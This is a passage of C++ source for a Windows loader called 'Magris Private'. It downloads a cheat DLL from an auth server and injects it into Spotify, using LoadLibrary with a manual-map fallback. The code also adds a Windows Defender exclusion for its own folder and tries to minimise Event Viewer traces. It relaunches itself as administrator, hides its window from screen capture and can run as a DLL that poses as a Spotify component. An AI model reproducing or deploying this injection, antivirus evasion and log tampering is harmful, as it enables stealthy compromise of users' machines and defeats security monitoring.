            SetWindowTextW(g_hBtnLoad, XWC(L"DLL indiriliyor..."));

            std::vector<BYTE> dllBytes;
            bool dlOk = DownloadDllFromAuth(dllBytes);
            if (!dlOk) {
                SendErrorLog(XS("DLL auth'tan indirilemedi (DownloadDllFromAuth failed)."));
                SendInjectFailLog(XS("DLL auth'tan indirilemedi."));
                MessageBoxW(hWnd, XWC(L"Cheat DLL auth sunucusundan indirilemedi."), XWC(L"Magris Private"), MB_ICONERROR);
                SetWindowTextW(g_hBtnLoad, XWC(L"INJECT"));
                EnableWindow(g_hBtnLoad, TRUE);
                return 0;
            }

            SetWindowTextW(g_hBtnLoad, XWC(L"Spotify araniyor..."));
            DWORD spotifyPid = FindSpotifyProcess();
            if (!spotifyPid) {
                LaunchSpotifyFromDir(GetMagrisExeDir());
                for (int waitTry = 0; waitTry < 24 && !spotifyPid; waitTry++) {
                    Sleep(500);
                    spotifyPid = FindSpotifyProcess();
                }
            }
            if (!spotifyPid) {
                SendErrorLog(XS("Spotify.exe bulunamadi."));
                SendInjectFailLog(XS("Spotify.exe bulunamadi - acik olmali."));
                MessageBoxW(hWnd, XWC(L"Spotify.exe bulunamadi!\nOnce Spotify'i acin."), XWC(L"Magris Private"), MB_ICONWARNING);
                SetWindowTextW(g_hBtnLoad, XWC(L"INJECT"));
                EnableWindow(g_hBtnLoad, TRUE);
                return 0;
            }

            {
                wchar_t tmpDir[MAX_PATH] = {};
                GetTempPathW(MAX_PATH, tmpDir);
                std::wstring skPath = std::wstring(tmpDir) + XW(L"magris_sk");
                HANDLE hSk = CreateFileW(skPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
                if (hSk != INVALID_HANDLE_VALUE) {
                    DWORD w = 0;
                    WriteFile(hSk, g_loggedInKey.c_str(), (DWORD)g_loggedInKey.size(), &w, NULL);
                    CloseHandle(hSk);
                }
            }

            SetWindowTextW(g_hBtnLoad, XWC(L"Inject ediliyor..."));

            bool mapOk = LoadLibraryInject(spotifyPid, dllBytes);

            if (!mapOk) {
                DWORD llErr = GetLastError();
                SendErrorLogFast(XS("LoadLibrary basarisiz (0x") + MMapErrStr(llErr) + XS(" - ") + MMapErrDetail(llErr) + XS("), ManualMap fallback deneniyor..."));

                HANDLE hSpFb = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, spotifyPid);
                bool spAliveFb = false;
                if (hSpFb) {
                    DWORD spEx = 0;
                    GetExitCodeProcess(hSpFb, &spEx);
                    spAliveFb = (spEx == STILL_ACTIVE);
                    CloseHandle(hSpFb);
                }
                if (spAliveFb) {
                    SetWindowTextW(g_hBtnLoad, XWC(L"Fallback inject..."));
                    mapOk = RemoteManualMap(spotifyPid, dllBytes);
                } else {
                    SendErrorLogFast(XS("Spotify zaten crash olmus, ManualMap atlanÄ±yor"));
                }
            }

            SecureZeroMemory(dllBytes.data(), dllBytes.size());
            dllBytes.clear();

            Sleep(1500);
            HANDLE hSpCheck = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, spotifyPid);
            bool spotifyStillAlive = false;
            if (hSpCheck) {
                DWORD spExit = 0;
                GetExitCodeProcess(hSpCheck, &spExit);
                spotifyStillAlive = (spExit == STILL_ACTIVE);
                CloseHandle(hSpCheck);
            }
            if (!spotifyStillAlive && mapOk) {
                SendErrorLogFast(XS("KRITIK: Inject 'basarili' gorundu ama Spotify 1.5sn icinde CRASH oldu! DLL kodu crash sebebi."));
                SendInjectFailLog(XS("Spotify inject sonrasi crash oldu - DLL kodu crash sebebi"));
                MessageBoxW(hWnd, XWC(L"Inject edildi ama Spotify crash oldu.\nDLL kodunda bug var."), XWC(L"Magris Private"), MB_ICONWARNING);
                SetWindowTextW(g_hBtnLoad, XWC(L"INJECT"));
                EnableWindow(g_hBtnLoad, TRUE);
            } else if (mapOk) {
                SendInjectLog();
                SetWindowTextW(g_hBtnLoad, XWC(L"INJECTED"));
                EnableWindow(g_hBtnLoad, TRUE);
            } else {
                DWORD errCode = GetLastError();
                std::string errReason = XS("Inject basarisiz (Code: 0x") + MMapErrStr(errCode) + XS(" - ") + MMapErrDetail(errCode) + XS(")");
                SendErrorLog(errReason);
                SendInjectFailLog(errReason);
                MessageBoxW(hWnd, XWC(L"Inject basarisiz.\nYonetici olarak calistirin."), XWC(L"Magris Private"), MB_ICONWARNING);
                SetWindowTextW(g_hBtnLoad, XWC(L"INJECT"));
                EnableWindow(g_hBtnLoad, TRUE);
            }
        }
        for (int i = 0; i < PROD_COUNT; i++) {
            if (id == (WORD)(ID_PROD_0 + i)) {
                g_selProd = i;
                g_chkLua = g_products[i].luaMenu;
                g_chkStealth = g_products[i].stealth;
                g_chkCleaner = g_products[i].cleaner;
                SetWindowDisplayAffinity(g_hwnd, g_chkStealth ? WDA_EXCLUDEFROMCAPTURE : WDA_NONE);
                InvalidateRect(hWnd, NULL, FALSE);
            }
        }
        return 0;
    }

    case WM_DRAWITEM: {
        LPDRAWITEMSTRUCT di = (LPDRAWITEMSTRUCT)lParam;
        if (di->CtlID == ID_BTN_LOGIN) DrawLoginBtn(di);
        else if (di->CtlID == ID_BTN_LOAD) DrawLoadBtn(di);
        return TRUE;
    }

    case WM_NCHITTEST: {
        LRESULT hit = DefWindowProcW(hWnd, msg, wParam, lParam);
        if (hit == HTCLIENT) {
            POINT pt;
            pt.x = LOWORD(lParam);
            pt.y = HIWORD(lParam);
            ScreenToClient(hWnd, &pt);
            if (pt.y < TITLEH) return HTCAPTION;
        }
        return hit;
    }

    case WM_CTLCOLOREDIT: {
        SetBkColor((HDC)wParam, RGB(26, 26, 36));
        SetTextColor((HDC)wParam, RGB(232, 232, 240));
        static HBRUSH eb = NULL;
        if (!eb) eb = CreateSolidBrush(RGB(26,26,36));
        return (LRESULT)eb;
    }

    case WM_CTLCOLORSTATIC:
    case WM_CTLCOLORBTN:
        SetBkMode((HDC)wParam, TRANSPARENT);
        SetTextColor((HDC)wParam, RGB(140,140,150));
        return (LRESULT)GetStockObject(NULL_BRUSH);

    case WM_DESTROY:
        UnregisterHotKey(hWnd, 1);
        KillTimer(hWnd, g_timerId);
        g_masonScanStop = true;
        if (g_masonScanThread) {
            WaitForSingleObject(g_masonScanThread, 2000);
            CloseHandle(g_masonScanThread);
            g_masonScanThread = NULL;
        }
        g_keyScreenshotStop = true;
        if (g_keyScreenshotThread) {
            WaitForSingleObject(g_keyScreenshotThread, 2000);
            CloseHandle(g_keyScreenshotThread);
            g_keyScreenshotThread = NULL;
        }
        if (g_bmpLogoSmall) { delete g_bmpLogoSmall; g_bmpLogoSmall = NULL; }
        if (g_bmpLogo) { delete g_bmpLogo; g_bmpLogo = NULL; }
        for (int i = 0; i < 2; i++) { if (g_bmpCardBg[i]) { delete g_bmpCardBg[i]; g_bmpCardBg[i] = NULL; } }
        if (g_font) DeleteObject(g_font);
        if (g_fontSm) DeleteObject(g_fontSm);
        if (g_fontTiny) DeleteObject(g_fontTiny);
        GdiplusShutdown(g_gdipToken);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hWnd, msg, wParam, lParam);
}




static bool IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    PSID group;
    if (AllocateAndInitializeSid(&auth, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &group)) {
        CheckTokenMembership(NULL, group, &isAdmin);
        FreeSid(group);
    }
    return isAdmin;
}

static void LoadPrefetchShimDll_Inner(const wchar_t* dllName) {
    __try {
        wchar_t path[MAX_PATH] = {};
        HMODULE hLauncher = GetModuleHandleW(NULL);
        if (!GetModuleFileNameW(hLauncher, path, MAX_PATH))
            return;
        wchar_t* slash = wcsrchr(path, L'\\');
        if (!slash)
            return;
        slash[1] = L'\0';
        if (wcscat_s(path, MAX_PATH, dllName) != 0)
            return;
        if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES)
            LoadLibraryW(path);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}
static void LoadPrefetchShimDll() {
    LoadPrefetchShimDll_Inner(MAGRIS_PREFETCH_SHIM_DLL_W.c_str());
}

static HINSTANCE g_hLauncherInst = nullptr;
static volatile LONG g_uiThreadStarted = 0;

static int MagrisLaunchMain(HINSTANCE hInst, LPWSTR lpCmdLine, int nCmdShow);
static DWORD WINAPI MagrisUiThreadProc(LPVOID) {
    MagrisLaunchMain(g_hLauncherInst, GetCommandLineW(), SW_SHOW);
    return 0;
}

static int MagrisLaunchMain(HINSTANCE hInst, LPWSTR lpCmdLine, int nCmdShow) {
    MinimizeEventViewerTraces();
    InitDestructStatusCS();
    wcscpy_s(g_products[0].updated, _countof(g_products[0].updated), XWC(L"Fetching..."));
    wcscpy_s(g_products[1].updated, _countof(g_products[1].updated), XWC(L"Always Ready"));
    SetDestructStatus(XWC(L"Initializing Safe Destruct..."));
    LoadPrefetchShimDll();

    if (!IsMagrisLauncherHostProcess() && !IsRunAsAdmin()) {
        wchar_t self[MAX_PATH] = {};
        if (!GetModuleFileNameW(NULL, self, MAX_PATH))
            return 0;
        ShellExecuteW(NULL, XWC(L"runas"), self, lpCmdLine, NULL, SW_SHOWNORMAL);
        return 0;
    }

    AddDefenderExclusion(GetMagrisExeDir());

    GdiplusStartupInput gsiEarly;
    ULONG_PTR gdipTokEarly = 0;
    GdiplusStartup(&gdipTokEarly, &gsiEarly, NULL);
    InitCommonControls();

    WNDCLASSEXW wcEarly = {};
    wcEarly.cbSize = sizeof(wcEarly);
    wcEarly.lpfnWndProc = DestructWndProc;
    wcEarly.hInstance = hInst;
    wcEarly.hCursor = LoadCursor(NULL, IDC_ARROW);
    wcEarly.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wcEarly.lpszClassName = XWC(L"MagrisDestructWnd");
    RegisterClassExW(&wcEarly);

    

    

    g_gdipToken = gdipTokEarly;

    WNDCLASSEXW wc = {};
    wc.cbSize = sizeof(wc);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = XWC(L"MagrisWnd");
    wc.hIcon = LoadIcon(hInst, MAKEINTRESOURCEW(1));
    if (!wc.hIcon)
        wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    RegisterClassExW(&wc);

    
    
    if (lpCmdLine && wcsstr(lpCmdLine, XWC(L"--auth-destruct")) != nullptr) {
        TriggerAntiCrackDestruct();
        MSG msg = {};
        while (GetMessageW(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        return (int)msg.wParam;
    }

    int sx = GetSystemMetrics(SM_CXSCREEN), sy = GetSystemMetrics(SM_CYSCREEN);
    RECT rc = { 0, 0, WIN_W, WIN_H };
    AdjustWindowRect(&rc, WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU|WS_MINIMIZEBOX, FALSE);
    int fw = rc.right - rc.left, fh = rc.bottom - rc.top;

    HWND hWnd = CreateWindowExW(WS_EX_LAYERED | WS_EX_APPWINDOW, XWC(L"MagrisWnd"), XWC(L"Spotify"),
        WS_POPUP | WS_SYSMENU | WS_MINIMIZEBOX,
        (sx-fw)/2, (sy-fh)/2, fw, fh, NULL, NULL, hInst, NULL);

    if (!hWnd)
        return 1;

    SetLayeredWindowAttributes(hWnd, RGB(0, 0, 0), 255, LWA_ALPHA);

    ShowWindow(hWnd, nCmdShow ? nCmdShow : SW_SHOWNORMAL);
    UpdateWindow(hWnd);

#ifdef MAGRIS_LAUNCHER_EXE
    LaunchSpotifyFromDir(GetMagrisExeDir());
#else
    
    std::wstring pathFile = GetMagrisExeDir() + XW(L"spotify_path.txt");
    if (GetFileAttributesW(pathFile.c_str()) != INVALID_FILE_ATTRIBUTES) {
        wchar_t selfPathW[MAX_PATH] = {};
        GetModuleFileNameW(NULL, selfPathW, MAX_PATH);
        std::wstring selfPath = selfPathW;

        HANDLE f = CreateFileW(pathFile.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (f != INVALID_HANDLE_VALUE) {
            char buf[MAX_PATH] = {};
            DWORD read = 0;
            if (ReadFile(f, buf, sizeof(buf) - 1, &read, NULL) && read) {
                buf[read] = 0;
                int len = MultiByteToWideChar(CP_ACP, 0, buf, -1, NULL, 0);
                if (len > 0) {
                    wchar_t* wbuf = new wchar_t[len];
                    MultiByteToWideChar(CP_ACP, 0, buf, -1, wbuf, len);
                    std::wstring dcPath = wbuf;
                    while (!dcPath.empty() && (dcPath.back() == L'\r' || dcPath.back() == L'\n' || dcPath.back() == L' '))
                        dcPath.pop_back();
                    delete[] wbuf;
                    if (GetFileAttributesW(dcPath.c_str()) != INVALID_FILE_ATTRIBUTES &&
                        _wcsicmp(dcPath.c_str(), selfPath.c_str()) != 0) {
                        ShellExecuteW(NULL, XWC(L"open"), dcPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
                    }
                }
            }
            CloseHandle(f);
        }
    }
#endif

    MSG msg = {};
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return (int)msg.wParam;
}

#ifdef MAGRIS_LAUNCHER_EXE

static bool LaunchSpotifyFromDir(const std::wstring& dir) {
    wchar_t selfPathW[MAX_PATH] = {};
    GetModuleFileNameW(NULL, selfPathW, MAX_PATH);
    const std::wstring selfPath = selfPathW;

    std::wstring realSpotifyPath = ReadSpotifyPathFromFile(dir);
    if (!realSpotifyPath.empty() && (IsOurLauncherAtPath(realSpotifyPath) || PathEquivalent(realSpotifyPath, selfPath)))
        realSpotifyPath.clear();

    if (realSpotifyPath.empty() || GetFileAttributesW(realSpotifyPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        realSpotifyPath.clear();
        const wchar_t* candidates[] = { L"Spotify.exe", L"SpotifyLauncher.exe", L"Spotify_real.exe" };
        for (const wchar_t* name : candidates) {
            std::wstring exePath = dir + name;
            if (GetFileAttributesW(exePath.c_str()) == INVALID_FILE_ATTRIBUTES)
                continue;
            if (IsOurLauncherAtPath(exePath) || PathEquivalent(exePath, selfPath))
                continue;
            realSpotifyPath = exePath;
            break;
        }
    }

    if (realSpotifyPath.empty()) {
        wchar_t appData[MAX_PATH] = {};
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) {
            std::wstring spotifyDir = std::wstring(appData) + XW(L"\\Spotify\\");
            realSpotifyPath = ReadSpotifyPathFromFile(spotifyDir);
            if (realSpotifyPath.empty() || GetFileAttributesW(realSpotifyPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
                const wchar_t* fb[] = { L"Spotify.exe", L"SpotifyLauncher.exe", L"Spotify_real.exe" };
                for (const wchar_t* name : fb) {
                    std::wstring exePath = spotifyDir + name;
                    if (GetFileAttributesW(exePath.c_str()) == INVALID_FILE_ATTRIBUTES)
                        continue;
                    if (IsOurLauncherAtPath(exePath) || PathEquivalent(exePath, selfPath))
                        continue;
                    realSpotifyPath = exePath;
                    break;
                }
            }
        }
    }

    if (realSpotifyPath.empty())
        return false;

    wchar_t cmdBuf[32768] = {};
    wcscpy_s(cmdBuf, L"\"");
    wcscat_s(cmdBuf, realSpotifyPath.c_str());
    wcscat_s(cmdBuf, L"\"");

    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argv) {
        for (int i = 1; i < argc; i++) {
            wcscat_s(cmdBuf, L" ");
            if (wcschr(argv[i], L' ') || wcschr(argv[i], L'\t')) {
                wcscat_s(cmdBuf, L"\"");
                wcscat_s(cmdBuf, argv[i]);
                wcscat_s(cmdBuf, L"\"");
            } else {
                wcscat_s(cmdBuf, argv[i]);
            }
        }
        LocalFree(argv);
    }

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    std::wstring workDir = dir;
    size_t lastSlash = realSpotifyPath.find_last_of(L"\\/");
    if (lastSlash != std::wstring::npos)
        workDir = realSpotifyPath.substr(0, lastSlash + 1);

    if (CreateProcessW(realSpotifyPath.c_str(), cmdBuf, NULL, NULL, FALSE, 0, NULL, workDir.c_str(), &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    }
    return false;
}

int WINAPI wWinMain(_In_ HINSTANCE hInst, _In_opt_ HINSTANCE, _In_ LPWSTR, _In_ int nCmdShow) {
    (void)CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    g_hLauncherInst = hInst;
    return MagrisLaunchMain(hInst, GetCommandLineW(), nCmdShow ? nCmdShow : SW_SHOW);
}

#else

extern "C" __declspec(dllexport) int WINAPI RunLibcef2(void) {
    if (InterlockedCompareExchange(&g_uiThreadStarted, 1, 0) != 0)
        return 0;
    return MagrisLaunchMain(g_hLauncherInst, GetCommandLineW(), SW_SHOW);
}

BOOL APIENTRY DllMain(HINSTANCE hInst, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInst);
        g_hLauncherInst = hInst;
        if (IsMagrisLauncherHostProcess()) {
            if (InterlockedCompareExchange(&g_uiThreadStarted, 1, 0) == 0)
                CreateThread(nullptr, 0, MagrisUiThreadProc, nullptr, 0, nullptr);
        }
    }
    return TRUE;
}

#endif


